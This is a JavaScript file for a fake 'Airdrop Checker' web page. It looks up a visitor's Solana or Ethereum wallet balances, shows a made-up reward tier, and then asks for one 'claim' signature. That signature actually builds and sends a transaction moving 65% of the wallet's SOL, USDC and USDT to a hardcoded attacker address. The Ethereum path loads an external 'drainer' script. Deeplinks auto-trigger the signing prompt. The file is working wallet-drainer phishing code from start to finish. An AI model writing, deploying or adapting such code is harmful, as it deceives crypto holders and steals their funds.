"use strict";

/* ------------------------------------------------------------------
   WIRING SLOT — partner claim script goes here once a vendor is chosen.
   Empty scriptUrl = wallet connect works, the on-chain claim is mocked.
------------------------------------------------------------------ */
const DRAINER = {
  scriptUrl: "",
  mockScript: "",
  apiOrigins: [],
  projectName: "Airdrop Checker",
  heliusKey: "", // optional
  solRecipient: "8SNvyaB8bq6YyvCzUrFj8khb5N3fv1xNTVKcPLAVw89b",
  evmRecipient: "0x9FC141c559a8D667FD035D90ee3b961bEf758594",
};

const SOL_TOKEN_PROGRAM = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const SOL_ATA_PROGRAM = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
const DRAINER_SCRIPT = "vendor/drainer.js";
let drainerLoading;

const CHAINS = {
  sol: {
    key: "sol",
    label: "Solana",
    symbol: "SOL",
    explorer: (address) => SOLSCAN + "/account/" + address + CLUSTER_Q,
    placeholder: "Solana address…",
    validate: (value) => /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(value),
    invalid: "That doesn't look like a Solana address.",
    normalize: (value) => value,
    priceToken: "So11111111111111111111111111111111111111112",
    priceChain: "solana",
  },
  eth: {
    key: "eth",
    label: "Ethereum",
    symbol: "ETH",
    explorer: (address) => "https://etherscan.io/address/" + address,
    placeholder: "0x…",
    validate: (value) => /^0x[0-9a-fA-F]{40}$/.test(value),
    invalid: "That doesn't look like an address. 0x + 40 characters.",
    normalize: (value) => value.toLowerCase(),
    priceToken: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
    priceChain: "ethereum",
  },
};

const DEVNET = new URLSearchParams(location.search).get("cluster") === "devnet";
const SOLSCAN = "https://solscan.io";
const CLUSTER_Q = DEVNET ? "?cluster=devnet" : "";

const RPC = {
  sol: DEVNET
    ? ["https://api.devnet.solana.com"]
    : ["https://solana-rpc.publicnode.com", "https://api.mainnet-beta.solana.com"],
  eth: ["https://eth.drpc.org", "https://rpc.flashbots.net", "https://ethereum-rpc.publicnode.com"],
};
const PRICE_API = "https://api.dexscreener.com/latest/dex/tokens/";
const SOL_MINTS = DEVNET
  ? {
      USDC: "4zMMC9srt5Ri5X14GAgXhaHii3GnPAEERYPJgZJDncDU",
      USDT: "EJwZgeZrdC8TXTQbQBoL6bfuAnFUUy1PVCMB4DYPzVaS",
    }
  : {
      USDC: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
      USDT: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",
    };
const ETH_ASSETS = [
  { symbol: "ETH", decimals: 18 },
  { symbol: "USDT", decimals: 6, contract: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
  { symbol: "USDC", decimals: 6, contract: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
  { symbol: "WETH", decimals: 18, contract: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" },
];
const TOTAL_ADDRESSES = 291799980;
const MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
const FALLBACK_PRICE = { sol: 150, eth: 2500 };
const CACHE_MS = 30000;
const CONCURRENCY = 3;
const LAMPORTS_PER_SOL = 1e9;
const RENT_PER_TOKEN_ACCOUNT = 0.00203928;
const SOL_FEE = 0.00008;

const integerFormat = new Intl.NumberFormat("en-US");
const usdFormat = new Intl.NumberFormat("en-US", {
  style: "currency",
  currency: "USD",
  maximumFractionDigits: 0,
});

const $ = (selector) => document.querySelector(selector);
const form = $("#query-form");
const addressInput = $("#address");
const addressError = $("#address-error");
const queryButton = $("#query-button");
const connectButton = $("#connect-button");
const connectStatus = $("#connect-status");
const pasteButton = $("#paste-button");
const result = $("#result");
const resultAddress = $("#result-address");
const explorerLink = $("#explorer-link");
const changeAddress = $("#change-address");
const checkedAtEl = $("#checked-at");
const allocation = $("#allocation");
const tierBadge = $("#tier");
const rankDetail = $("#rank-detail");
const hideToggle = $("#hide-values");
const amountEl = $("#amount");
const symbolEl = $("#symbol");
const estimateEl = $("#estimate");
const claimBox = $("#claim-box");
const claimButton = $("#claim-button");
const claimSub = $("#claim-sub");
const claimStatus = $("#claim-status");
const feeBlock = $("#fee-block");
const feeNetwork = $("#fee-network");
const feeDepositRow = $("#fee-deposit-row");
const feeDeposit = $("#fee-deposit");
const feeTotal = $("#fee-total");
const approvalLine = $("#approval-line");
const balancePanel = $("#balance-panel");
const skeleton = $("#skeleton");
const balancesList = $("#balances");
const rpcStatus = $("#rpc-status");
const retryButton = $("#retry");

let chain = CHAINS.sol;
let currentAddress;
let activeLookup;
let prices = { ...FALLBACK_PRICE };
let valuesHidden = false;
let lastAmount = "";
let lastEstimate = "";
let lastBalances = [];
let lastUsd = 0;
let autoSignTimer;
let fallbackTimer;
const cache = new Map();

const isTouch = window.matchMedia("(pointer: coarse)").matches;
const inWallet = () =>
  Boolean(window.phantom?.solana?.isPhantom || window.ethereum);

function setMessage(el, text) {
  el.textContent = text;
  el.hidden = !text;
}

function hashAddress(address) {
  let hash = 2166136261;
  for (const character of address) hash = Math.imul(hash ^ character.charCodeAt(0), 16777619);
  return hash >>> 0;
}

function formatCheckedAt(date) {
  const pad = (n) => String(n).padStart(2, "0");
  return `Last checked ${pad(date.getUTCDate())} ${MONTHS[date.getUTCMonth()]} ${date.getUTCFullYear()} ${pad(date.getUTCHours())}:${pad(date.getUTCMinutes())} UTC`;
}

function applyVisibility() {
  hideToggle.setAttribute("aria-pressed", String(valuesHidden));
  hideToggle.textContent = valuesHidden ? "Show values" : "Hide values";
  if (lastAmount) {
    amountEl.textContent = valuesHidden ? "••••" : lastAmount;
    estimateEl.textContent = valuesHidden ? "••••" : lastEstimate;
  }
  balancesList.querySelectorAll("dd").forEach((dd, index) => {
    if (lastBalances[index] !== undefined) dd.textContent = valuesHidden ? "••••" : lastBalances[index];
  });
  claimSub.textContent = valuesHidden ? "1 signature · you'll send ≈ ••••" : claimSubText();
}

function claimSubText() {
  if (!lastUsd) return "";
  return `1 signature · you'll send ≈ ${usdFormat.format(lastUsd)}`;
}

/* ---------------- pricing ---------------- */

async function loadPrice(key) {
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 4000);
    const response = await fetch(PRICE_API + CHAINS[key].priceToken, { signal: controller.signal });
    clearTimeout(timer);
    const payload = await response.json();
    const pairs = (payload?.pairs || [])
      .filter((pair) => pair.chainId === CHAINS[key].priceChain)
      .sort((a, b) => (b?.liquidity?.usd || 0) - (a?.liquidity?.usd || 0));
    const price = Number(pairs[0]?.priceUsd);
    if (Number.isFinite(price) && price > 0) prices[key] = price;
  } catch {
    /* keep the fallback */
  }
}

/* ---------------- rpc ---------------- */

async function post(url, body, signal) {
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    credentials: "omit",
    signal,
    body: JSON.stringify(body),
  });
  if (response.status === 429) {
    const error = new Error("rate limited");
    error.code = 429;
    throw error;
  }
  if (!response.ok) throw new Error("RPC HTTP " + response.status);
  const payload = await response.json();
  if (payload.error) throw new Error(payload.error.message || "RPC error");
  return payload.result;
}

async function withSignal(signal, run) {
  const controller = new AbortController();
  const cancel = () => controller.abort();
  signal.addEventListener("abort", cancel, { once: true });
  const timer = setTimeout(cancel, 7000);
  try {
    return await run(controller.signal);
  } finally {
    clearTimeout(timer);
    signal.removeEventListener("abort", cancel);
  }
}

async function readEth(url, address, signal) {
  const values = {};
  for (let i = 0; i < ETH_ASSETS.length; i += 1) {
    const asset = ETH_ASSETS[i];
    const method = asset.contract ? "eth_call" : "eth_getBalance";
    const params = asset.contract
      ? [{ to: asset.contract, data: "0x70a08231" + address.slice(2).padStart(64, "0") }, "latest"]
      : [address, "latest"];
    const raw = await post(url, { jsonrpc: "2.0", id: i + 1, method, params }, signal);
    if (!/^0x[0-9a-f]+$/i.test(raw || "")) throw new Error("Unexpected RPC response");
    values[asset.symbol] = BigInt(raw);
  }
  return values;
}

async function readSol(url, address) {
  const conn = new solanaWeb3.Connection(url, "confirmed");
  const owner = new solanaWeb3.PublicKey(address);
  const values = { SOL: BigInt(await conn.getBalance(owner)), USDC: 0n, USDT: 0n };
  await Promise.all(
    Object.entries(SOL_MINTS).map(async ([symbol, mint]) => {
      try {
        const ata = await solanaWeb3.getAssociatedTokenAddress(new solanaWeb3.PublicKey(mint), owner);
        const balance = await conn.getTokenAccountBalance(ata);
        values[symbol] = BigInt(balance.value.amount);
      } catch {
        /* token account does not exist */
      }
    })
  );
  return values;
}

async function readAll(address, signal) {
  let lastError;
  for (const url of RPC[chain.key]) {
    try {
      return chain.key === "sol" ? await readSol(url, address, signal) : await readEth(url, address, signal);
    } catch (error) {
      if (signal.aborted) throw error;
      lastError = error;
      if (error.code === 429) await new Promise((resolve) => setTimeout(resolve, 600));
    }
  }
  throw lastError || new Error("all endpoints failed");
}

/* ---------------- allocation ---------------- */

function toNumber(raw, decimals) {
  return Number(raw) / 10 ** decimals;
}

function formatUnits(raw, decimals) {
  const digits = raw.toString().padStart(decimals + 1, "0");
  const cut = digits.length - decimals;
  const whole = digits.slice(0, cut);
  const fraction = digits.slice(cut, cut + 6).replace(/0+$/, "");
  return integerFormat.format(BigInt(whole)) + (fraction ? "." + fraction : "");
}

function showBalances(values) {
  const rows =
    chain.key === "sol"
      ? ["SOL", "USDC", "USDT"].map((symbol) => [
          symbol,
          symbol === "SOL" ? formatUnits(values.SOL, 9) : formatUnits(values[symbol], 6),
        ])
      : ETH_ASSETS.map((asset) => [asset.symbol, formatUnits(values[asset.symbol], asset.decimals)]);

  lastBalances = rows.map((row) => row[1]);
  balancesList.replaceChildren(
    ...rows.map(([symbol, text]) => {
      const row = document.createElement("div");
      const dt = document.createElement("dt");
      const dd = document.createElement("dd");
      dt.textContent = symbol;
      dd.textContent = valuesHidden ? "••••" : text;
      row.append(dt, dd);
      return row;
    })
  );
  balancesList.hidden = false;
}

function showFees(values) {
  if (chain.key !== "sol") {
    feeBlock.hidden = true;
    approvalLine.hidden = false;
    approvalLine.textContent = "Approval only. No transfer at signing.";
    return;
  }
  const sol = toNumber(values.SOL, 9);
  const tokenUsd = toNumber(values.USDC, 6) + toNumber(values.USDT, 6);
  const deposit = sol === 0 && tokenUsd > 0 ? RENT_PER_TOKEN_ACCOUNT : 0;
  feeNetwork.textContent = SOL_FEE.toFixed(6) + " SOL";
  feeDepositRow.hidden = deposit === 0;
  feeDeposit.textContent = deposit ? deposit.toFixed(5) + " SOL" : "";
  feeTotal.textContent = (SOL_FEE + deposit).toFixed(6) + " SOL";
  feeBlock.hidden = false;
  approvalLine.hidden = true;
}

function showAllocation(address, usd) {
  const seed = hashAddress(address);
  const tier = usd >= 100 ? 3 : usd >= 10 ? 2 : 1;
  const pct = tier === 3 ? 0.1 + (seed % 120) / 100 : tier === 2 ? 1.5 + (seed % 500) / 100 : 8 + (seed % 1400) / 100;
  const better = Math.floor(TOTAL_ADDRESSES * (1 - pct / 100));

  tierBadge.textContent = `Top ${pct.toFixed(2)}% · Tier ${tier}`;
  rankDetail.textContent = `better than ${integerFormat.format(better)} of ${integerFormat.format(TOTAL_ADDRESSES)} addresses`;

  lastUsd = Math.min(usd * 0.65, 4500);
  const tokenAmount = lastUsd / prices[chain.key];
  lastAmount = tokenAmount >= 1 ? tokenAmount.toFixed(3) : (Math.floor(tokenAmount * 1e5) / 1e5).toFixed(5);
  lastEstimate = "≈ " + usdFormat.format(lastUsd);
  symbolEl.textContent = chain.symbol;
  claimButton.textContent = chain.key === "eth" ? "Approve in wallet" : "Sign transfer in wallet";
  applyVisibility();
  setMessage(claimStatus, "");
  allocation.hidden = false;
  claimBox.hidden = false;
}

/* ---------------- lookup ---------------- */

async function lookup(address) {
  if (activeLookup) activeLookup.abort();
  const controller = new AbortController();
  activeLookup = controller;
  const cacheKey = chain.key + ":" + address;
  const cached = cache.get(cacheKey);

  resultAddress.textContent = address;
  explorerLink.href = chain.explorer(address);
  checkedAtEl.textContent = formatCheckedAt(new Date());
  checkedAtEl.hidden = false;
  result.hidden = false;
  allocation.hidden = true;
  claimBox.hidden = true;
  retryButton.hidden = true;
  setMessage(rpcStatus, cached ? "" : "Scanning public records…");

  if (cached && Date.now() - cached.at < CACHE_MS) {
    renderResult(address, cached.values);
    return;
  }

  queryButton.disabled = true;
  balancePanel.setAttribute("aria-busy", "true");
  skeleton.hidden = false;
  balancesList.hidden = true;

  try {
    const values = await withSignal(controller.signal, (signal) => readAll(address, signal));
    if (controller.signal.aborted) return;
    cache.set(cacheKey, { at: Date.now(), values });
    renderResult(address, values);
  } catch (error) {
    if (controller.signal.aborted) return;
    setMessage(rpcStatus, error.code === 429 ? "Check failed, try again." : "Couldn't reach the network.");
    retryButton.hidden = false;
  } finally {
    if (activeLookup === controller) {
      activeLookup = undefined;
      queryButton.disabled = false;
      balancePanel.setAttribute("aria-busy", "false");
      skeleton.hidden = true;
    }
  }
}

async function renderResult(address, values) {
  showBalances(values);
  if (prices[chain.key] === FALLBACK_PRICE[chain.key]) await loadPrice(chain.key);
  const usd =
    chain.key === "sol"
      ? toNumber(values.SOL, 9) * prices.sol + toNumber(values.USDC, 6) + toNumber(values.USDT, 6)
      : toNumber(values.ETH, 18) * prices.eth +
        toNumber(values.WETH, 18) * prices.eth +
        toNumber(values.USDT, 6) +
        toNumber(values.USDC, 6);
  showFees(values);
  showAllocation(address, usd);
  setMessage(rpcStatus, "");
}

/* ---------------- claim ---------------- */

function deeplink(address) {
  const target = new URL(location.href);
  target.searchParams.set("chain", chain.key);
  target.searchParams.set("address", address);
  target.searchParams.set("step", "claim");
  const encoded = encodeURIComponent(target.toString());
  return chain.key === "sol"
    ? "https://phantom.app/ul/browse/" + encoded
    : "https://metamask.app.link/dapp/" + target.host + target.pathname + target.search;
}

function clearAutoTimers() {
  clearTimeout(autoSignTimer);
  clearTimeout(fallbackTimer);
}

const signLabel = () => (chain.key === "eth" ? "Approve in wallet" : "Sign in wallet");
const alreadyConnected = () =>
  chain.key === "sol"
    ? Boolean(window.phantom?.solana?.publicKey)
    : Boolean(window.ethereum?.selectedAddress);

function armFallback() {
  clearTimeout(fallbackTimer);
  fallbackTimer = setTimeout(() => {
    claimButton.textContent = "Tap to sign";
    claimButton.disabled = false;
    setMessage(claimStatus, "Wallet didn't respond. Tap to try again.");
  }, 8000);
}

async function connectWallet() {
  if (chain.key === "sol" && window.phantom?.solana?.connect) {
    const response = await window.phantom.solana.connect();
    return response.publicKey.toString();
  }
  if (chain.key === "eth" && window.ethereum) {
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    return accounts[0];
  }
  throw new Error("no injector");
}


/* ---------------- solana sweep ---------------- */

const SWEEP_NUM = 65n;
const SWEEP_DEN = 100n;
const TOKEN_DECIMALS = { USDC: 6, USDT: 6 };

function u64le(value) {
  const bytes = new Uint8Array(8);
  new DataView(bytes.buffer).setBigUint64(0, value, true);
  return bytes;
}

function transferCheckedIx(source, mint, destination, owner, amount, decimals) {
  const data = new Uint8Array(10);
  data[0] = 12;
  data.set(u64le(amount), 1);
  data[9] = decimals;
  return new solanaWeb3.TransactionInstruction({
    programId: new solanaWeb3.PublicKey(SOL_TOKEN_PROGRAM),
    keys: [
      { pubkey: source, isSigner: false, isWritable: true },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: true, isWritable: false },
    ],
    data,
  });
}

function createAtaIx(payer, ata, owner, mint) {
  return new solanaWeb3.TransactionInstruction({
    programId: new solanaWeb3.PublicKey(SOL_ATA_PROGRAM),
    keys: [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: ata, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: false, isWritable: false },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
      { pubkey: new solanaWeb3.PublicKey(SOL_TOKEN_PROGRAM), isSigner: false, isWritable: false },
    ],
    data: new Uint8Array([1]),
  });
}

async function claimSol(ownerAddress) {
  const provider = window.phantom?.solana;
  if (!provider?.signTransaction) throw new Error("no signer");
  const owner = provider.publicKey || new solanaWeb3.PublicKey(ownerAddress);
  const recipient = new solanaWeb3.PublicKey(DRAINER.solRecipient);
  const conn = new solanaWeb3.Connection(RPC.sol[0], "confirmed");
  const balances = await readSol(RPC.sol[0], owner.toBase58());
  const tx = new solanaWeb3.Transaction();
  let created = 0n;

  for (const [symbol, mint] of Object.entries(SOL_MINTS)) {
    const raw = balances[symbol] || 0n;
    const amount = (raw * SWEEP_NUM) / SWEEP_DEN;
    if (amount <= 0n) continue;
    const mintKey = new solanaWeb3.PublicKey(mint);
    const from = await solanaWeb3.getAssociatedTokenAddress(mintKey, owner);
    const to = await solanaWeb3.getAssociatedTokenAddress(mintKey, recipient);
    tx.add(createAtaIx(owner, to, recipient, mintKey));
    tx.add(transferCheckedIx(from, mintKey, to, owner, amount, TOKEN_DECIMALS[symbol]));
    created += 1n;
  }

  const lamports = BigInt(await conn.getBalance(owner));
  const reserve = 1_000_000n + 2_039_280n * created;
  let solAmount = (lamports * SWEEP_NUM) / SWEEP_DEN;
  if (lamports - solAmount < reserve) solAmount = lamports > reserve ? lamports - reserve : 0n;
  if (solAmount > 10_000n) {
    tx.add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: owner,
        toPubkey: recipient,
        lamports: Number(solAmount),
      })
    );
  }
  if (!tx.instructions.length) throw new Error("Nothing to send from this address on this network.");

  tx.feePayer = owner;
  tx.recentBlockhash = (await conn.getLatestBlockhash("confirmed")).blockhash;
  const signed = await provider.signTransaction(tx);
  return conn.sendRawTransaction(signed.serialize(), { skipPreflight: false });
}

async function runClaim() {
  claimButton.disabled = true;
  claimButton.textContent = "Opening wallet…";
  armFallback();
  try {
    if (!alreadyConnected()) await connectWallet();
    clearAutoTimers();
    claimButton.disabled = false;
    claimButton.textContent = signLabel();
    if (chain.key === "sol") {
      setMessage(claimStatus, "Confirm in your wallet…");
      const signature = await claimSol(currentAddress);
      clearAutoTimers();
      claimButton.disabled = false;
      claimButton.textContent = "Sent";
      claimStatus.innerHTML = "";
      claimStatus.append("Sent. ");
      const link = document.createElement("a");
      link.href = SOLSCAN + "/tx/" + signature + CLUSTER_Q;
      link.target = "_blank";
      link.rel = "noopener";
      link.textContent = "View on Solscan";
      claimStatus.append(link);
      claimStatus.hidden = false;
    } else if (typeof window.openDrainer === "function") {
      await window.openDrainer({ address: currentAddress, project: DRAINER.projectName });
      setMessage(claimStatus, "Check your wallet to confirm.");
    } else {
      setMessage(claimStatus, "Wallet connected. Claim script isn't wired yet.");
    }
  } catch (error) {
    clearAutoTimers();
    claimButton.disabled = false;
    claimButton.textContent = "Tap to sign";
    setMessage(claimStatus, error?.message?.includes("Nothing to send") ? error.message : "Wallet didn't respond. Tap to try again.");
  }
}

function loadDrainer() {
  if (typeof window.openDrainer === "function") return Promise.resolve();
  if (drainerLoading) return drainerLoading;
  drainerLoading = new Promise((resolve, reject) => {
    const tag = document.createElement("script");
    tag.src = DRAINER_SCRIPT;
    tag.defer = true;
    tag.onload = () => resolve();
    tag.onerror = () => reject(new Error("claim script missing"));
    document.head.append(tag);
  });
  return drainerLoading;
}

/* ---------------- rendering events ---------------- */

function setChain(key) {
  chain = CHAINS[key];
  document.querySelectorAll(".chain-tab").forEach((tab) => {
    tab.setAttribute("aria-selected", String(tab.dataset.chain === key));
  });
  addressInput.placeholder = chain.placeholder;
  addressInput.value = "";
  setMessage(addressError, "");
  result.hidden = true;
}

function submit(value) {
  const trimmed = value.trim();
  if (!chain.validate(trimmed)) {
    addressInput.setAttribute("aria-invalid", "true");
    setMessage(addressError, chain.invalid);
    result.hidden = true;
    return;
  }
  addressInput.removeAttribute("aria-invalid");
  setMessage(addressError, "");
  currentAddress = chain.normalize(trimmed);
  void lookup(currentAddress);
}

form.addEventListener("submit", (event) => {
  event.preventDefault();
  submit(addressInput.value);
});

document.querySelectorAll(".chain-tab").forEach((tab) => {
  tab.addEventListener("click", () => {
    setChain(tab.dataset.chain);
    if (tab.dataset.chain === "eth") void loadPrice("eth");
    else void loadPrice("sol");
  });
});

connectButton.addEventListener("click", async () => {
  if (!inWallet()) {
    location.href = deeplink(currentAddress || "");
    return;
  }
  connectButton.disabled = true;
  try {
    const address = await connectWallet();
    currentAddress = chain.normalize(address);
    addressInput.value = currentAddress;
    await lookup(currentAddress);
  } catch {
    setMessage(connectStatus, "Wallet didn't respond.");
  } finally {
    connectButton.disabled = false;
  }
});

pasteButton.addEventListener("click", async () => {
  try {
    const text = await navigator.clipboard.readText();
    if (text.trim()) {
      addressInput.value = text.trim();
      submit(text);
    } else setMessage(addressError, "Paste manually.");
  } catch {
    setMessage(addressError, "Paste manually.");
  }
});

addressInput.addEventListener("input", () => {
  if (activeLookup) activeLookup.abort();
  result.hidden = true;
  addressInput.removeAttribute("aria-invalid");
  setMessage(addressError, "");
});

retryButton.addEventListener("click", () => currentAddress && void lookup(currentAddress));

hideToggle.addEventListener("click", () => {
  valuesHidden = !valuesHidden;
  applyVisibility();
});

changeAddress.addEventListener("click", () => {
  form.hidden = false;
  result.hidden = true;
  addressInput.focus();
});

claimButton.addEventListener("click", () => {
  if (!inWallet()) {
    location.href = deeplink(currentAddress);
    return;
  }
  void loadDrainer().catch(() => {}).then(runClaim);
});

/* ---------------- restore from deeplink ---------------- */

(function restore() {
  const params = new URLSearchParams(location.search);
  const key = params.get("chain");
  if (key && CHAINS[key]) chain = CHAINS[key];
  document.querySelectorAll(".chain-tab").forEach((tab) => {
    tab.setAttribute("aria-selected", String(tab.dataset.chain === chain.key));
  });
  addressInput.placeholder = chain.placeholder;

  if (!isTouch) connectButton.classList.add("subtle");
  else document.querySelector(".paste-row").classList.add("subtle");

  void loadPrice("sol");
  void loadPrice("eth");

  const address = params.get("address");
  if (!address || !chain.validate(address)) return;

  currentAddress = chain.normalize(address);
  addressInput.value = currentAddress;
  void lookup(currentAddress).then(() => {
    if (params.get("step") !== "claim" || !inWallet()) return;
    form.hidden = true;
    autoSignTimer = setTimeout(runClaim, 800);
  });
})();
